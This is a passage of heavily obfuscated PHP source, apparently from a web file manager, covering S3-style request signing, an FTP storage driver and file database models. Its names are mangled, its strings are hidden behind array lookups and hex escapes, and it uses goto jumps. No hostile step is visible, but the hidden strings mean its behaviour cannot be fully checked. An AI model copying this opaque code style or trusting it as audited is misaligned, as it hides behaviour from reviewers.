$this->bucket), array($ÀÂ÷ŸÛ³[306] => $õÚ¹ÇŸ¹), array($ÀÂ÷ŸÛ³[267], $ÀÂ÷ŸÛ³[268], $ÀÂ÷ŸÛ³[12]), array($ÀÂ÷ŸÛ³[267], $ÀÂ÷ŸÛ³[269], $ÀÂ÷ŸÛ³[12]), array($ÀÂ÷ŸÛ³[267], $ÀÂ÷ŸÛ³[307], $ÀÂ÷ŸÛ³[12]), array($ÀÂ÷ŸÛ³[270] => $ìÃ©à†¼), array($ÀÂ÷ŸÛ³[271] => $¹™šÂÌ), array($ÀÂ÷ŸÛ³[272] => $´ëƒŞä³), array($ÀÂ÷ŸÛ³[273] => $ñ¨ªˆ—), array($ÀÂ÷ŸÛ³[274] => $Õ°ã‰µ·))); $íêª©ÅÚ = base64_encode(json_encode($‡äïâ˜Ã)); $¶ôæÀç± = hash_hmac($ÀÂ÷ŸÛ³[275], $ª€€»ƒÊ, $ÀÂ÷ŸÛ³[276] . $this->secret, !0); $Šì…”ºî = hash_hmac($ÀÂ÷ŸÛ³[275], $this->region, $¶ôæÀç±, !0); $ò¼èëª = hash_hmac($ÀÂ÷ŸÛ³[275], $‘€¼ä‚ı, $Šì…”ºî, !0); $ßƒï¦´— = hash_hmac($ÀÂ÷ŸÛ³[275], $½·± Ù­, $ò¼èëª, !0); $ŒÙ‚Ûøİ = hash_hmac($ÀÂ÷ŸÛ³[275], $íêª©ÅÚ, $ßƒï¦´—); $ğñÚÜŠ“ = array($ÀÂ÷ŸÛ³[246] => $ÀÂ÷ŸÛ³[12], $ÀÂ÷ŸÛ³[294] => $ÀÂ÷ŸÛ³[12], $ÀÂ÷ŸÛ³[306] => $õÚ¹ÇŸ¹, $ÀÂ÷ŸÛ³[270] => $ìÃ©à†¼, $ÀÂ÷ŸÛ³[277] => $íêª©ÅÚ, $ÀÂ÷ŸÛ³[308] => $¹™šÂÌ, $ÀÂ÷ŸÛ³[309] => $´ëƒŞä³, $ÀÂ÷ŸÛ³[310] => $ñ¨ªˆ—, $ÀÂ÷ŸÛ³[311] => $Õ°ã‰µ·, $ÀÂ÷ŸÛ³[312] => $ŒÙ‚Ûøİ, $ÀÂ÷ŸÛ³[206] => $this->getHost()); return $ğñÚÜŠ“; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($„«»ü‡¥) { parent::__construct(); if (count($„«»ü‡¥) > 0) { $this->_init($„«»ü‡¥); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¨ìÚ¸ïµ) { $×âñš¹ =& $_SERVER[µÅ˜º…æ]; global $config; $this->appCharset = $config[$×âñš¹[1647]]; $this->systemCharset = $config[$×âñš¹[1648]]; if (isset($¨ìÚ¸ïµ[$×âñš¹[1649]]) && $¨ìÚ¸ïµ[$×âñš¹[1649]]) { $this->systemCharset = $¨ìÚ¸ïµ[$×âñš¹[1649]]; } } public function iconvApp($Û¡ñ¦ş±) { return $this->iconvTo($Û¡ñ¦ş±, $this->systemCharset, $this->appCharset); } public function iconvSystem($Áú’â™) { return $this->iconvTo($Áú’â™, $this->appCharset, $this->systemCharset); } public function getPathOuter($Â´±à˜) { $İšï§€ =& $_SERVER[µÅ˜º…æ]; $¡éğ¥¤ı = $this->iconvApp($this->pathBase); $Â´±à˜ = $this->iconvApp($Â´±à˜); if (substr($¡éğ¥¤ı, 0, 2) == $İšï§€[1524]) { $¡éğ¥¤ı = BASIC_PATH . substr($¡éğ¥¤ı, 2); } if (substr($Â´±à˜, 0, 2) == $İšï§€[1524]) { $Â´±à˜ = BASIC_PATH . substr($Â´±à˜, 2); } $¡éğ¥¤ı = KodIO::clear($¡éğ¥¤ı); $Â´±à˜ = KodIO::clear($Â´±à˜); $Â´±à˜ = substr($Â´±à˜, strlen($¡éğ¥¤ı)); if (empty($this->pathDriver)) { return $Â´±à˜; } return $this->pathDriver . $İšï§€[8] . ltrim($Â´±à˜, $İšï§€[8]); } private function _init($¬¨ÛÜı€ = array()) { $˜ÙÙËÒÁ =& $_SERVER[µÅ˜º…æ]; if (!function_exists($˜ÙÙËÒÁ[1650])) { throw new Exception(LNG($˜ÙÙËÒÁ[1651])); } $this->config = $¬¨ÛÜı€; $this->charsetReset($¬¨ÛÜı€); foreach ($¬¨ÛÜı€ as $ÇÏİ“Ü => $ĞÕÁ£) { if (isset($this->{$ÇÏİ“Ü})) { $this->{$ÇÏİ“Ü} = $ĞÕÁ£; } } return $this->_login($¬¨ÛÜı€); } private function _login($‡áèü¡Ù) { $¦¤±Šğ =& $_SERVER[µÅ˜º…æ]; static $õäõ§Ó = array(); $Ïó÷Ğ©€ = md5(json_encode($‡áèü¡Ù)); if (isset($õäõ§Ó[$Ïó÷Ğ©€])) { foreach ($õäõ§Ó[$Ïó÷Ğ©€] as $î‰ ö½µ => $ÎïÊõº) { $this->{$î‰ ö½µ} = $ÎïÊõº; } return !0; } $ÀúÄü„ö = parse_url(trim($this->server, $¦¤±Šğ[8])); $this->host = $ÀúÄü„ö[$¦¤±Šğ[206]]; $·ù¹Òüò = isset($ÀúÄü„ö[$¦¤±Šğ[205]]) && $ÀúÄü„ö[$¦¤±Šğ[205]] == $¦¤±Šğ[1652] ? !0 : !1; $this->scheme = $·ù¹Òüò ? $¦¤±Šğ[1653] : $¦¤±Šğ[1654]; $this->port = isset($ÀúÄü„ö[$¦¤±Šğ[207]]) ? $ÀúÄü„ö[$¦¤±Šğ[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¦¤±Šğ[1655]) . $this->host . $¦¤±Šğ[4] . $this->port, !0); return !1; } $ú¸Èõ“µ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ú¸Èõ“µ) { $this->writeLog(LNG($¦¤±Šğ[1656]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $¦¤±Šğ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $îÎ°ö = $this->pasv == $¦¤±Šğ[91] ? !0 : !1; @ftp_pasv($this->connect, $îÎ°ö); $õäõ§Ó[$Ïó÷Ğ©€] = array($¦¤±Šğ[1657] => $this->connect, $¦¤±Šğ[206] => $this->host, $¦¤±Šğ[205] => $this->scheme, $¦¤±Šğ[207] => $this->port); return $ú¸Èõ“µ; } private function _isconn($ĞôâÀŒ = true) { if (is_resource($this->connect)) { return !0; } if (!$ĞôâÀŒ) { return !1; } return $this->_login($this->config); } public function mkfile($àıì‹Æ, $ùËÂ™Úö = '', $¶úıÈ = REPEAT_RENAME) { if ($this->setContent($àıì‹Æ, $ùËÂ™Úö)) { return $this->getPathOuter($àıì‹Æ); } $this->writeLog(LNG($_SERVER[µÅ˜º…æ][1658]), !0); return !1; } public function mkdir($ÈŒİØö, $óâ¬Í„ö = REPEAT_SKIP) { $ªìÓü¡ =& $_SERVER[µÅ˜º…æ]; if (!$ÈŒİØö || $ÈŒİØö == $ªìÓü¡[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÈŒİØö = $this->iconvSystem($ÈŒİØö); if ($this->_isFolder($ÈŒİØö) || @ftp_mkdir($this->connect, $ÈŒİØö)) { return $this->getPathOuter($ÈŒİØö); } if (!$this->mkdir($this->pathFather($ÈŒİØö))) { return !1; } if ($ÈŒİØö = @ftp_mkdir($this->connect, $ÈŒİØö)) { return $this->getPathOuter($ÈŒİØö); } $ŒÕ«Í¥ = __FUNCTION__ . $ªìÓü¡[1659]; $this->writeLog($ŒÕ«Í¥, !0); return !1; } public function copyFile($¿­ƒŸ•, $‡¹ß¿–) { if (!$this->_isconn()) { return !1; } $€æÌºÀ = $this->pathThis($this->iconvSystem($¿­ƒŸ•)); $õ Íë™ = $this->tempFile($€æÌºÀ); $¤‡ÊïªÕ = $this->iconvApp($õ Íë™); $this->download($¿­ƒŸ•, $¤‡ÊïªÕ); $¥ôÂ™ö‡ = $this->upload($‡¹ß¿–, $¤‡ÊïªÕ); $this->tempFileRemve($õ Íë™); return $¥ôÂ™ö‡; } public function moveFile($¤ÎÃû™Ğ, $½ˆÖ¡Ñª) { if (!$this->_isconn()) { return !1; } $¤ÎÃû™Ğ = $this->iconvSystem($¤ÎÃû™Ğ); $½ˆÖ¡Ñª = $this->iconvSystem($½ˆÖ¡Ñª); $Ú¹§€ç = @ftp_rename($this->connect, $¤ÎÃû™Ğ, $½ˆÖ¡Ñª); if (!$Ú¹§€ç) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } return $this->getPathOuter($½ˆÖ¡Ñª); } public function delFile($–°•—óë) { if (!$this->_isconn()) { return !1; } $–°•—óë = $this->iconvSystem($–°•—óë); $ÜîşÆÎ = @ftp_delete($this->connect, $–°•—óë); if (!$ÜîşÆÎ) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); } return $ÜîşÆÎ; } public function delFolder($—…½±áù) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $‚¢Ê“¯Ø = $ÉğşØĞŞ = array(); $this->fileList($—…½±áù, $‚¢Ê“¯Ø, $ÉğşØĞŞ, !0); $this->listItemCache = !0; foreach ($ÉğşØĞŞ as $¥Á»¦±ì) { $ºòø•Õ× = $this->iconvSystem($¥Á»¦±ì[$_SERVER[µÅ˜º…æ][32]]); $˜Ìîğ¢† = @ftp_delete($this->connect, $ºòø•Õ×); if (!$˜Ìîğ¢†) { return !1; } } foreach ($‚¢Ê“¯Ø as $ºòø•Õ×) { $ºòø•Õ× = $this->iconvSystem($ºòø•Õ×); $˜Ìîğ¢† = @ftp_rmdir($this->connect, $ºòø•Õ×); if (!$˜Ìîğ¢†) { return !1; } } $—…½±áù = $this->iconvSystem($—…½±áù); return @ftp_rmdir($this->connect, $—…½±áù); } public function rename($Ê‹äÇşİ, $ÙÃ•×…‘) { $±¡šçµÑ =& $_SERVER[µÅ˜º…æ]; if (!$this->_isconn()) { return !1; } $ä™øßı— = $this->fileNameAuto($this->pathFather($Ê‹äÇşİ), $ÙÃ•×…‘); $ä™øßı— = $this->iconvSystem($ä™øßı—); $Ê‹äÇşİ = $this->iconvSystem($Ê‹äÇşİ); $ó¼îğàÒ = $this->pathFather($Ê‹äÇşİ); $å«€éµ = rtrim($ó¼îğàÒ, $±¡šçµÑ[8]) . $±¡šçµÑ[8] . $ä™øßı—; $€êçû´ = @ftp_rename($this->connect, $Ê‹äÇşİ, $å«€éµ); if (!$€êçû´) { $this->writeLog(__FUNCTION__ . $±¡šçµÑ[1659], !0); return !1; } $å«€éµ = $this->iconvApp($å«€éµ); return $this->getPathOuter($å«€éµ); } private function folderInfo($ƒ˜± ºŠ, $¯çãİÅ  = false) { $å¤¶å‡ñ =& $_SERVER[µÅ˜º…æ]; $ÚœìòÛØ = array($å¤¶å‡ñ[32] => $this->pathThis($ƒ˜± ºŠ), $å¤¶å‡ñ[87] => $this->getPathOuter($å¤¶å‡ñ[8] . $ƒ˜± ºŠ), $å¤¶å‡ñ[33] => $å¤¶å‡ñ[78]); if ($¯çãİÅ ) { return $ÚœìòÛØ; } $ÚœìòÛØ[$å¤¶å‡ñ[231]] = $ÚœìòÛØ[$å¤¶å‡ñ[88]] = 0; $ÚœìòÛØ[$å¤¶å‡ñ[232]] = $ÚœìòÛØ[$å¤¶å‡ñ[233]] = !0; return $ÚœìòÛØ; } private function fileInfo($ˆçÇ¬õ, $ŒÄ”¡¼¦ = false, $¿§±Îæœ = array()) { $š±™Â¤ú =& $_SERVER[µÅ˜º…æ]; $ú«ÌÂÂ± = array($š±™Â¤ú[32] => $this->pathThis($ˆçÇ¬õ), $š±™Â¤ú[87] => $this->getPathOuter($š±™Â¤ú[8] . $ˆçÇ¬õ), $š±™Â¤ú[33] => $š±™Â¤ú[230], $š±™Â¤ú[79] => isset($¿§±Îæœ[$š±™Â¤ú[79]]) ? $¿§±Îæœ[$š±™Â¤ú[79]] : 0, $š±™Â¤ú[166] => $this->ext($ˆçÇ¬õ)); if ($ŒÄ”¡¼¦) { return $ú«ÌÂÂ±; } $ú«ÌÂÂ±[$š±™Â¤ú[231]] = $ú«ÌÂÂ±[$š±™Â¤ú[88]] = 0; $ú«ÌÂÂ±[$š±™Â¤ú[232]] = $ú«ÌÂÂ±[$š±™Â¤ú[233]] = !0; $î¹Òê² = $this->iconvSystem($ˆçÇ¬õ); $ú«ÌÂÂ±[$š±™Â¤ú[88]] = @ftp_mdtm($this->connect, $î¹Òê²); if (empty($¿§±Îæœ)) { $¿§±Îæœ = $this->objectMeta($ˆçÇ¬õ); if (!$¿§±Îæœ) { return $ú«ÌÂÂ±; } } $ú«ÌÂÂ±[$š±™Â¤ú[79]] = $¿§±Îæœ[$š±™Â¤ú[79]]; return $ú«ÌÂÂ±; } public function size($ş¥Ş) { $Ì°»Ö¤Å = $this->objectMeta($ş¥Ş); return $Ì°»Ö¤Å ? $Ì°»Ö¤Å[$_SERVER[µÅ˜º…æ][79]] : 0; } public function info($òıâèòñ) { if ($this->isFile($òıâèòñ)) { return $this->fileInfo($òıâèòñ, 0); } else { if ($this->isFolder($òıâèòñ)) { return $this->folderInfo($òıâèòñ); } } return !1; } private function fileList($õ©Ñ·Ğ¥, &$ÀÈìúà, &$¢¯†¡Ü, $œ®°º† = false) { $îÔğ­è§ =& $_SERVER[µÅ˜º…æ]; $õ©Ñ·Ğ¥ = $this->iconvSystem($õ©Ñ·Ğ¥); if (!$this->isFolder($õ©Ñ·Ğ¥)) { return !1; } $õ©Ñ·Ğ¥ = rtrim($õ©Ñ·Ğ¥, $îÔğ­è§[8]) . $îÔğ­è§[8]; check_abort(); $°¸õÕûÃ = @ftp_rawlist($this->connect, $õ©Ñ·Ğ¥); if (!$°¸õÕûÃ) { $°¸õÕûÃ = array(); } $äâ‘„¹õ = array($îÔğ­è§[10] => 1, $îÔğ­è§[1469] => 1); foreach ($°¸õÕûÃ as $ëÈİŒõ) { $¶ˆë±Üà = $this->_listItem($ëÈİŒõ); if ($¶ˆë±Üà[0] == $îÔğ­è§[858]) { continue; } $‚ˆÔÜÜÚ = $¶ˆë±Üà[8]; if (empty($‚ˆÔÜÜÚ) && $‚ˆÔÜÜÚ !== $îÔğ­è§[228] || isset($äâ‘„¹õ[$‚ˆÔÜÜÚ])) { continue; } $‚ˆÔÜÜÚ = $this->iconvApp($õ©Ñ·Ğ¥ . ltrim($‚ˆÔÜÜÚ, $îÔğ­è§[8])); $—Ì•‰™„ = array($îÔğ­è§[32] => $‚ˆÔÜÜÚ, $îÔğ­è§[33] => $îÔğ­è§[230], $îÔğ­è§[79] => $¶ˆë±Üà[4]); if (substr($ëÈİŒõ, 0, 1) == $îÔğ­è§[1660]) { $—Ì•‰™„[$îÔğ­è§[33]] = $îÔğ­è§[78]; $—Ì•‰™„[$îÔğ­è§[79]] = 0; } $™¢œŒÆ§ = $—Ì•‰™„[$îÔğ­è§[33]] == $îÔğ­è§[78] ? !0 : !1; $this->cacheMethodInfoSet($‚ˆÔÜÜÚ, $™¢œŒÆ§, $—Ì•‰™„); if ($™¢œŒÆ§) { $ÀÈìúà[] = $‚ˆÔÜÜÚ; if ($œ®°º†) { $this->fileList($‚ˆÔÜÜÚ, $ÀÈìúà, $¢¯†¡Ü, $œ®°º†); } continue; } $¢¯†¡Ü[] = $—Ì•‰™„; } $this->cacheMethodInfoSet($õ©Ñ·Ğ¥, !0); } private function _listItem($ªæ¸½) { if (empty($ªæ¸½)) { return array(); } $ôßœ·Û— = preg_split($_SERVER[µÅ˜º…æ][1661], $ªæ¸½); if (count($ôßœ·Û—) <= 9) { return $ôßœ·Û—; } $ôßœ·Û—[8] = trim(substr($ªæ¸½, strpos($ªæ¸½, $ôßœ·Û—[7]) + strlen($ôßœ·Û—[7]))); return array_splice($ôßœ·Û—, 0, 9); } public function listPath($ëŞ¤˜›“, $™¼õÃ = false) { $–à­æï² =& $_SERVER[µÅ˜º…æ]; if (!$this->_isconn()) { return !1; } $ªß›ûıô = $º²á‹ğ¯ = array(); $this->fileList($ëŞ¤˜›“, $ªß›ûıô, $º²á‹ğ¯); foreach ($ªß›ûıô as $ğî–”Í => $ÇŞ›‡) { $ªß›ûıô[$ğî–”Í] = $this->folderInfo($ÇŞ›‡, $™¼õÃ); } foreach ($º²á‹ğ¯ as $ğî–”Í => $ÇŞ›‡) { $º²á‹ğ¯[$ğî–”Í] = $this->fileInfo($ÇŞ›‡[$–à­æï²[32]], $™¼õÃ, $ÇŞ›‡); } return array($–à­æï²[85] => $ªß›ûıô, $–à­æï²[86] => $º²á‹ğ¯); } public function has($Ô¤áíÁ›, $Ó¥ß¬ƒ´ = false, $«ÈæÁá = true) { $åÄÛÑóé =& $_SERVER[µÅ˜º…æ]; $úÜéÅîé = $¸»˜å… = array(); $Š¬¬ÂÖ» = $Ó¥ß¬ƒ´ ? !0 : !1; $this->fileList($Ô¤áíÁ›, $úÜéÅîé, $¸»˜å…, $Š¬¬ÂÖ»); if ($Ó¥ß¬ƒ´) { return array($åÄÛÑóé[239] => count($¸»˜å…), $åÄÛÑóé[240] => count($úÜéÅîé)); } if ($«ÈæÁá) { if (count($¸»˜å…)) { return !0; } } else { if (count($úÜéÅîé)) { return !0; } } return !1; } public function listAll($·¿Š™À) { $Š’“™âô =& $_SERVER[µÅ˜º…æ]; if (!$this->_isconn()) { return !1; } $ø‹¿Í¤ = $»£ó³ = array(); $this->fileList($·¿Š™À, $ø‹¿Í¤, $»£ó³, !0); $ü“Œ†¡¨ = array_to_keyvalue($»£ó³, $Š’“™âô[32]); foreach ($ø‹¿Í¤ as $„õ× Çğ) { if (is_string($„õ× Çğ)) { $ü“Œ†¡¨[$„õ× Çğ] = array($Š’“™âô[79] => 0); } } return $this->listAllFiles($·¿Š™À, $ü“Œ†¡¨); } public function getContent($‡Ò”Äü—) { if (!$this->_isconn()) { return !1; } $‡Ò”Äü— = $this->iconvSystem($‡Ò”Äü—); return $this->fileSubstr($‡Ò”Äü—); } public function setContent($Òü£›, $á›±œØ‰ = '') { if (!$this->_isconn()) { return !1; } $†Ô‹¯« = $this->pathThis($this->iconvSystem($Òü£›)); $Õáğ¯¨­ = $this->tempFile($†Ô‹¯«); file_put_contents($Õáğ¯¨­, $á›±œØ‰); $ãÂà·×Ğ = $this->upload($Òü£›, $this->iconvApp($Õáğ¯¨­)); $this->tempFileRemve($Õáğ¯¨­); return $ãÂà·×Ğ; } public function fileSubstr($ç¥í‡Ô, $ò³ô¯ºÃ = 0, $ƒ“ä°Ë = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ç¥í‡Ô, $ò³ô¯ºÃ, $ƒ“ä°Ë); } private function ftpRequest($í—­Ê¦à, $¹ù®·µ = 0, $Ç¢­ººÀ = false) { $´«‚ÉÃ =& $_SERVER[µÅ˜º…æ]; $í—­Ê¦à = $´«‚ÉÃ[8] . ltrim(str_ltrim($í—­Ê¦à, $this->ftpPath), $´«‚ÉÃ[8]); $í—­Ê¦à = $this->iconvSystem($í—­Ê¦à); $¢‹û³’Á = $this->scheme . $this->host . $´«‚ÉÃ[4] . $this->port; $…±Á‘×€ = curl_init(); curl_setopt($…±Á‘×€, CURLOPT_URL, $¢‹û³’Á . $this->pathEncode($í—­Ê¦à)); curl_setopt($…±Á‘×€, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ç¢­ººÀ) { $™¬±Ñ·ğ = $¹ù®·µ + $Ç¢­ººÀ - 1; curl_setopt($…±Á‘×€, CURLOPT_RANGE, "{$¹ù®·µ}\55{$™¬±Ñ·ğ}"); } curl_setopt($…±Á‘×€, CURLOPT_RETURNTRANSFER, 1); $Ï‰èàˆ´ = curl_exec($…±Á‘×€); curl_close($…±Á‘×€); return $Ï‰èàˆ´; } public function upload($»¸€øü, $‰íå«²É, $¨ê–ãâœ = false, $§İ’ó³° = REPEAT_REPLACE) { if (!$‰íå«²É || !@file_exists($‰íå«²É)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($»¸€øü))) { return !1; } $»¸€øü = $this->iconvSystem($»¸€øü); $‰íå«²É = $this->iconvSystem($‰íå«²É); $Å£¥Æù‡ = ftp_nb_put($this->connect, $»¸€øü, $‰íå«²É, FTP_BINARY); while ($Å£¥Æù‡ == FTP_MOREDATA) { $Å£¥Æù‡ = ftp_nb_continue($this->connect); } if ($Å£¥Æù‡ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } return $this->getPathOuter($»¸€øü); } public function download($”ø‘µ£ë, $ÄÜø¾”Ÿ = '') { if (!$this->_isconn()) { return !1; } $ÊÙˆÛ¦º = $this->pathFather($ÄÜø¾”Ÿ); if (!IO::mkdir($ÊÙˆÛ¦º)) { return !1; } $”ø‘µ£ë = $this->iconvSystem($”ø‘µ£ë); $ÄÜø¾”Ÿ = $this->iconvSystem($ÄÜø¾”Ÿ); $×Üï’¯° = ftp_nb_get($this->connect, $ÄÜø¾”Ÿ, $”ø‘µ£ë, FTP_BINARY); while ($×Üï’¯° == FTP_MOREDATA) { $×Üï’¯° = ftp_nb_continue($this->connect); } if ($×Üï’¯° != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } return $this->iconvApp($ÄÜø¾”Ÿ); } public function exist($ƒšÎ–‡) { return $this->isFile($ƒšÎ–‡) || $this->isFolder($ƒšÎ–‡); } public function isFile($İëÛä¥Î) { return !$this->isFolder($İëÛä¥Î) && $this->objectMeta($İëÛä¥Î); } public function isFolder($ù’¢ˆ¦ş) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][177], $ù’¢ˆ¦ş); } protected function objectMeta($ÜÔ›¤Çì) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][179], $ÜÔ›¤Çì); } protected function _objectMeta($÷²…Øè) { $³‘èô×© =& $_SERVER[µÅ˜º…æ]; if ($÷²…Øè == $³‘èô×©[12] || $÷²…Øè == $³‘èô×©[8]) { return array(); } if (!$this->_isconn()) { return !1; } $÷²…Øè = $this->iconvSystem($÷²…Øè); $ÍÙ×ì¤× = array($³‘èô×©[32] => $this->iconvApp($÷²…Øè), $³‘èô×©[33] => $³‘èô×©[230], $³‘èô×©[79] => 0); $Š¯™ÜïÓ = @ftp_size($this->connect, $÷²…Øè); if ($Š¯™ÜïÓ != -1) { $ÍÙ×ì¤×[$³‘èô×©[79]] = $Š¯™ÜïÓ; } else { $—†Èá¼¸ = @ftp_chdir($this->connect, $÷²…Øè); if (!$—†Èá¼¸) { return !1; } @ftp_chdir($this->connect, $³‘èô×©[8]); $ÍÙ×ì¤×[$³‘èô×©[33]] = $³‘èô×©[78]; } return $ÍÙ×ì¤×; } protected function _isFolder($ÅıÛŞğÜ) { $’Šùø¸ì =& $_SERVER[µÅ˜º…æ]; if ($ÅıÛŞğÜ == $’Šùø¸ì[12] || $ÅıÛŞğÜ == $’Šùø¸ì[8]) { return !0; } $÷ãîüË¬ = $this->_objectMeta($ÅıÛŞğÜ); return isset($÷ãîüË¬[$’Šùø¸ì[33]]) && $÷ãîüË¬[$’Šùø¸ì[33]] == $’Šùø¸ì[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($©¸“×§) { parent::__construct($©¸“×§); $this->setSignVersion($_SERVER[µÅ˜º…æ][247]); } public function uploadLink($­¨ïûæè, $ºöÜç = 0) { $ÙÈßÈßê =& $_SERVER[µÅ˜º…æ]; if ($this->isUploadServer()) { return; } $ĞšÜàÕ = $this->getType(); if (!in_array($ĞšÜàÕ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¥±Ğ£ü» = (!$ºöÜç ? 1 : ceil($ºöÜç / pow(1024, 3))) * 3600 * 4; $²ÙÆ²”Ş = $this->uploadMultiData($­¨ïûæè, $¥±Ğ£ü»); if ($²ÙÆ²”Ş) { $²ÙÆ²”Ş[$ÙÈßÈßê[95]] = $­¨ïûæè; $²ÙÆ²”Ş[$ÙÈßÈßê[96]] = $ĞšÜàÕ; } return $²ÙÆ²”Ş; } public function fileOutImage($®œ«Æİç, $ƒ—¬å©“ = 250) { if ($this->size($®œ«Æİç) > 1024 * 1024 * 25) { return $this->fileOutImageServer($®œ«Æİç, $ƒ—¬å©“); } $Óèéå·÷ = $this->link($®œ«Æİç); $Óèéå·÷ .= $_SERVER[µÅ˜º…æ][1662] . $ƒ—¬å©“; $this->fileOutLink($Óèéå·÷); } } goto BÂË‹„èé§; AêŞ¢ŞÉ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\x65\137\143\157\156\x74\x65\156\164\163"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\124\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\x73\145\x72\x74", "\146\165\156\x63\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\x6d\145" => "\x69\x6f\137\146\x69\154\145\x5f\x6d\x65\164\141", "\155\145\164\141\106\x69\145\154\144" => "\x66\151\x6c\x65\111\104"); public function fileInfo($ü€¬„á³) { $ÓÎ¨ãñ¡ =& $_SERVER[µÅ˜º…æ]; static $ÕÀ÷»§§ = array(); if (!isset($ÕÀ÷»§§[$ü€¬„á³])) { $¢ÕŞş¦² = $ÓÎ¨ãñ¡[2232]; $¿Ö¨“õ³ = Model($ÓÎ¨ãñ¡[560])->field($¢ÕŞş¦²)->where(array($ÓÎ¨ãñ¡[558] => $ü€¬„á³))->find(); $ÕÀ÷»§§[$ü€¬„á³] = $¿Ö¨“õ³; } return $ÕÀ÷»§§[$ü€¬„á³]; } public function addFileByContent($‘Ï»û³â = '', $—üñÒ”Ğ, $¹Ç¡…ª’ = '') { $ğĞøú„ =& $_SERVER[µÅ˜º…æ]; $ÒÒøé¿ = TEMP_PATH . $ğĞøú„[2233]; if (!is_dir($ÒÒøé¿)) { mk_dir($ÒÒøé¿); } $ËÓğŒ®è = $ÒÒøé¿ . $ğĞøú„[2234] . rand_string(16); $£¦—®·Ÿ = file_put_contents($ËÓğŒ®è, $‘Ï»û³â); if ($£¦—®·Ÿ === !1 || strlen($‘Ï»û³â) != $£¦—®·Ÿ) { return !1; } $ùàŸ¦®Ù = $this->addFile($ËÓğŒ®è, $—üñÒ”Ğ, $¹Ç¡…ª’, !0); if (file_exists($ËÓğŒ®è)) { @unlink($ËÓğŒ®è); } return $ùàŸ¦®Ù; } public function createFileName($Åò±¯²á, $ùµÍ½ó†, $™åÊœİ = false, $ÚàšµÔ = false) { $Áœ—à–Ó =& $_SERVER[µÅ˜º…æ]; $è¤±Èœ² = IO::init($Áœ—à–Ó[8]); $æÄßùší = $this->_makeFilePath($Åò±¯²á, $ùµÍ½ó†, $è¤±Èœ², $™åÊœİ, $ÚàšµÔ); $ÀÓáß§Õ = $è¤±Èœ²->pathFather($æÄßùší); static $¢Øššè = false; $³±”¼Ğ÷ = $Áœ—à–Ó[2235] . md5($ÀÓáß§Õ); if (!$¢Øššè && !Cache::get($³±”¼Ğ÷)) { $¢Øššè = !0; $£¦©—å§ = IO::mkdir($ÀÓáß§Õ); if (!IO::exist($£¦©—å§ . $Áœ—à–Ó[898])) { IO::mkfile($£¦©—å§ . $Áœ—à–Ó[898]); } Cache::set($³±”¼Ğ÷, 1, 3600 * 2); } return $æÄßùší; } public function _makeFilePath($…¶šÊ½æ, $½Ø×­õœ, $Ùóó¶ƒ°, $Ê·«Óà = false, $ìíğó«ª = false) { $ïİß¢í =& $_SERVER[µÅ˜º…æ]; $È²Ñ“òó = Model($ïİß¢í[872])->get($ïİß¢í[2236]); $³ÖÂ›Ï  = $ïİß¢í[1428] . $½Ø×­õœ[$ïİß¢í[487]] . $ïİß¢í[499] . date($ïİß¢í[2237]); $õ¡‹ˆ½ = $³ÖÂ›Ï  . rand_string(5) . short_id(100); $…¶šÊ½æ = str_replace($ïİß¢í[8], $ïİß¢í[11], KodIO::clear($…¶šÊ½æ)); $ Û·¦£ = $Ùóó¶ƒ°->ext($…¶šÊ½æ); if (!$…¶šÊ½æ) { $È²Ñ“òó = $ïİß¢í[943]; } switch ($È²Ñ“òó) { case $ïİß¢í[2238]: if ($ Û·¦£) { $õ¡‹ˆ½ = $õ¡‹ˆ½ . $ïİß¢í[10] . $ Û·¦£; } if ($ Û·¦£ == $ïİß¢í[2173]) { $õ¡‹ˆ½ .= $ïİß¢í[1397]; } break; case $ïİß¢í[2239]: $Ó³®Î£ˆ = Model($ïİß¢í[872])->get($ïİß¢í[873]); $´ƒÔû = substr(md5($ïİß¢í[874] . $Ó³®Î£ˆ . date($ïİß¢í[848])), 0, 8); $³ÖÂ›Ï  = $ïİß¢í[1428] . $½Ø×­õœ[$ïİß¢í[487]] . $ïİß¢í[499] . date($ïİß¢í[2240]) . $´ƒÔû . $ïİß¢í[8]; if ($ Û·¦£ == $ïİß¢í[2173]) { $…¶šÊ½æ .= $ïİß¢í[1397]; } $±Ûİ„¬Ü = $ïİß¢í[2241] . $³ÖÂ›Ï  . $…¶šÊ½æ; CacheLock::lock($±Ûİ„¬Ü); $õ¡‹ˆ½ = $³ÖÂ›Ï  . $…¶šÊ½æ; if (IO::exist($³ÖÂ›Ï  . $…¶šÊ½æ)) { $ì–é±¾“ = substr($…¶šÊ½æ, 0, strlen($…¶šÊ½æ) - strlen($ Û·¦£)); $ËÊšÑ– = $ìíğó«ª ? substr($ìíğó«ª, 0, 5) : ($Ê·«Óà ? 